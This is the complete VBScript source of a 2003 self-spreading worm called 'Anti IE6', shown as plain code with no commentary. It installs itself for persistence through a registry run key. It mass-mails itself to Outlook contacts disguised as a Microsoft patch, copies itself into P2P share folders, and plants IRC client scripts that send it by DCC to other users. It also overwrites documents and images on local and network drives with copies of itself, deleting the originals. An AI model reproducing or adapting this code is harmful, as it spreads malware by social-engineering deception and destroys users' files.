' VBS/Anti IE6 by Электроник, 19.03.2003
On Error Resume Next
Set REFYYGPDLMQWZYIV7 = CreateObject("Scripting.FileSystemObject")
Set DKRBZUSOVLHDGZVM8 = CreateObject("WScript.Shell")
Set IFZWMPKGQMWJPSCC9 = REFYYGPDLMQWZYIV7.GetFile(WScript.ScriptFullName)
IFZWMPKGQMWJPSCC9.Copy (REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
Set ShowWorm = REFYYGPDLMQWZYIV7.GetFile(REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
ShowWorm.Attributes = 0
IFZWMPKGQMWJPSCC9.Copy (REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\win32.vbs")
DKRBZUSOVLHDGZVM8.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\win32", "Wscript.exe " & REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\win32.vbs %1"
Set RAWEFFEWWNVJEOAA1 = CreateObject("Outlook.Application")
If Not RAWEFFEWWNVJEOAA1 = "" Then
For Each DGJHHTHHGMNQKQMS2 In RAWEFFEWWNVJEOAA1.GetNameSpace("MAPI").AddressLists
For IBQCUOZYBNCWUJUH3 = 1 To DGJHHTHHGMNQKQMS2.AddressEntries.Count
ACKAJXUBGNJJJDOO5 = Chr(87) & Chr(83) & Chr(72) & Chr(87) & Chr(67)
MIXDLLXLQMAQQFAG6 = DKRBZUSOVLHDGZVM8.RegRead("HKEY_CURRENT_USER\Software\" & ACKAJXUBGNJJJDOO5 & "\Anti IE6\" & DGJHHTHHGMNQKQMS2.AddressEntries(IBQCUOZYBNCWUJUH3))
If MIXDLLXLQMAQQFAG6 <> ACKAJXUBGNJJJDOO5 Then
Set UHDFWCCJLMUDAKGZ4 = RAWEFFEWWNVJEOAA1.CreateItem(0)
UHDFWCCJLMUDAKGZ4.Recipients.Add (DGJHHTHHGMNQKQMS2.AddressEntries(IBQCUOZYBNCWUJUH3))
UHDFWCCJLMUDAKGZ4.Subject = "Re: Microsoft"
UHDFWCCJLMUDAKGZ4.Body = "Здравствуйте компания Microsoft предлагает вам новую бесплатную услугу по зашиванию дыр в Internet Explore 6 (чтобы зашить дырку запустите файл сценария)"
UHDFWCCJLMUDAKGZ4.Attachments.Add (REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
UHDFWCCJLMUDAKGZ4.DeleteAfterSubmit = True
UHDFWCCJLMUDAKGZ4.Importance = 2
UHDFWCCJLMUDAKGZ4.Send
DKRBZUSOVLHDGZVM8.RegWrite "HKEY_CURRENT_USER\Software\" & ACKAJXUBGNJJJDOO5 & "\Anti IE6\" & DGJHHTHHGMNQKQMS2.AddressEntries(IBQCUOZYBNCWUJUH3), ACKAJXUBGNJJJDOO5
End If
Next
Next
End If
NAGQZKBXLNMPZLKR10 = DKRBZUSOVLHDGZVM8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
For SwitchFolders = 0 To 9
FolderArray = Array("C:\Kazaa\My Shared Folder", _
NAGQZKBXLNMPZLKR10 & "\KaZaA Lite\My Shared Folder", _
"C:\My Downloads", _
NAGQZKBXLNMPZLKR10 & "\Kazaa\My Shared Folder", _
NAGQZKBXLNMPZLKR10 & "\KaZaA Lite\My Shared Folder", _
NAGQZKBXLNMPZLKR10 & "\Bearshare\Shared", _
NAGQZKBXLNMPZLKR10 & "\Edonkey2000", _
NAGQZKBXLNMPZLKR10 & "\Morpheus\My Shared Folder", _
NAGQZKBXLNMPZLKR10 & "\Grokster\My Grokster", _
NAGQZKBXLNMPZLKR10 & "\ICQ\Shared Files")
If REFYYGPDLMQWZYIV7.FolderExists(FolderArray(SwitchFolders)) Then
IFZWMPKGQMWJPSCC9.Copy (FolderArray(SwitchFolders) & "\IE6.vbs")
Set ShowP2PFile = REFYYGPDLMQWZYIV7.GetFile(FolderArray(SwitchFolders) & "\IE6.vbs")
ShowP2PFile.Attributes = 0
End If
Next
IFZWMPKGQMWJPSCC9.Copy (REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
Set ShowMircCopy = REFYYGPDLMQWZYIV7.GetFile(REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
ShowMircCopy.Attributes = 0
NAGQZKBXLNMPZLKR10 = DKRBZUSOVLHDGZVM8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If REFYYGPDLMQWZYIV7.FileExists("C:\Mirc\Mirc.ini") Then
mIRCPath = "C:\Mirc"
Else
If REFYYGPDLMQWZYIV7.FileExists("C:\Mirc32\Mirc.ini") Then
mIRCPath = "C:\Mirc32"
Else
If REFYYGPDLMQWZYIV7.FileExists(NAGQZKBXLNMPZLKR10 & "\Mirc\Mirc.ini") Then
mIRCPath = NAGQZKBXLNMPZLKR10 & "\Mirc"
End If
End If
End If
If Not mIRCPath = "" Then
Set WriteMirc = REFYYGPDLMQWZYIV7.CreateTextFile(mIRCPath & "\Script.ini", True)
WriteMirc.WriteLine ("[script]")
WriteMirc.WriteLine ("n5= on 1:JOIN:#:{")
WriteMirc.WriteLine ("n6= /if ( $nick == $me ) { halt }")
WriteMirc.WriteLine ("n7= /msg $nick Microsoft Зашивание дыр в системе!")
WriteMirc.WriteLine ("n8= /dcc send -c $nick " & REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
WriteMirc.WriteLine ("n9= }")
WriteMirc.Close
Set HideScript = REFYYGPDLMQWZYIV7.GetFile(mIRCPath & "\Script.ini")
HideScript.Attributes = 2
End If
IFZWMPKGQMWJPSCC9.Copy (REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
Set ShowPirchCopy = REFYYGPDLMQWZYIV7.GetFile(REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
ShowPirchCopy.Attributes = 0
If REFYYGPDLMQWZYIV7.FolderExists("C:\Pirch") Then
PirchPath = "C:\Pirch"
Else
If REFYYGPDLMQWZYIV7.FolderExists("C:\Pirch32") Then
PirchPath = "C:\Pirch32"
Else
NAGQZKBXLNMPZLKR10 = DKRBZUSOVLHDGZVM8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If REFYYGPDLMQWZYIV7.FolderExists(NAGQZKBXLNMPZLKR10 & "\Pirch") Then
PirchPath = NAGQZKBXLNMPZLKR10 & "\Pirch"
End If
End If
End If
If Not PirchPath = "" Then
Set WritePirch = REFYYGPDLMQWZYIV7.CreateTextFile(Path & "\Events.ini", True)
WritePirch.WriteLine ("[Levels]")
WritePirch.WriteLine ("Enabled=1")
WritePirch.WriteLine ("Count=6")
WritePirch.WriteLine ("Level1=000-Unknowns")
WritePirch.WriteLine ("000-UnknownsEnabled=1")
WritePirch.WriteLine ("Level2=100-Level 100")
WritePirch.WriteLine ("100-Level 100Enabled=1")
WritePirch.WriteLine ("Level3=200-Level 200")
WritePirch.WriteLine ("200-Level 200Enabled=1")
WritePirch.WriteLine ("Level4=300-Level 300")
WritePirch.WriteLine ("300-Level 300Enabled=1")
WritePirch.WriteLine ("Level5=400-Level 400")
WritePirch.WriteLine ("400-Level 400Enabled=1")
WritePirch.WriteLine ("Level6=500-Level 500")
WritePirch.WriteLine ("500-Level 500Enabled=1")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[000-Unknowns]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("Event1=ON JOIN:#:/msg $nick Новая программа по зашиванию дыр в Internet Explore бесплатно")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[100-Level 100]")
WritePirch.WriteLine ("User1=*!*@*")
WritePirch.WriteLine ("UserCount=1")
WritePirch.WriteLine ("Event1=ON JOIN:#:/dcc send $nick " & REFYYGPDLMQWZYIV7.GetSpecialFolder(1) & "\IE6.vbs")
WritePirch.WriteLine ("EventCount=1")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[200-Level 200]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[300-Level 300]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[400-Level 400]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.WriteLine ("")
WritePirch.WriteLine ("[500-Level 500]")
WritePirch.WriteLine ("UserCount=0")
WritePirch.WriteLine ("EventCount=0")
WritePirch.Close
Set HideScript2 = REFYYGPDLMQWZYIV7.GetFile(PirchPath & "\Events.ini")
HideScript2.Attributes = 2
End If
If Day(Now) = 13 And Month(Now) = 0 Then
DKRBZUSOVLHDGZVM8.Run "Rundll32.exe User.exe,ExitWindows"
End If
E1()
Sub E1()
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
For Each SeekNetCopyDrives In a.Drives
If SeekNetCopyDrives.DriveType = 2 _
Or SeekNetCopyDrives.DriveType = 3 Then
E3 (SeekNetCopyDrives.Path & "\")
End If
Next
End Sub
Sub E2(FileTarget)
On Error Resume Next
Set otf = a.GetFile(WScript.ScriptFullName)
ra = otf.ReadAll
otf.Close
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.Files
FileExt = LCase(a.GetExtensionName(n.Path))
If FileExt = "bmp" Or FileExt = "txt" Or FileExt = "ico" Or FileExt = "wmp" Or FileExt = "doc" Or FileExt = "jpg" Then
REFYYGPDLMQWZYIV7.CopyFile WScript.ScriptFullName, n.Path & ".vbs"
REFYYGPDLMQWZYIV7.DeleteFile (n.Path)
End If
Next
End Sub
Sub E3(FileTarget)
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.SubFolders
E2 (n.Path)
E3 (n.Path)
Next
End Sub
